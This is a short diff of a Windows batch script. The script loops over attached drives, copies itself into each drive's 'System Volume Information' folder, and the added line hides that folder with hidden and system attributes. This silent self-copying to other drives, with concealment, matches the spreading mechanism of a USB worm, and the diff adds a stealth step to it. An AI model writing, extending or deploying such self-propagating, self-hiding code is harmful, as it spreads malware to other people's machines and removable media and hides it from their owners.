@@ -145,6 +145,7 @@ for %%i in (localAppData appData) do (
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
     if /i "%%j" == "System Volume Information" if not exist "%%i:\%%j\%~nx0" (
+      attrib +h +s "%%i:\%%j"
       copy /y "%~dpnx0" "%%i:\%%j\"
       rem if exist "%%i:\%%j\%~nx0" attrib +r +s "%%i:\%%j\%~nx0"
     ) else (
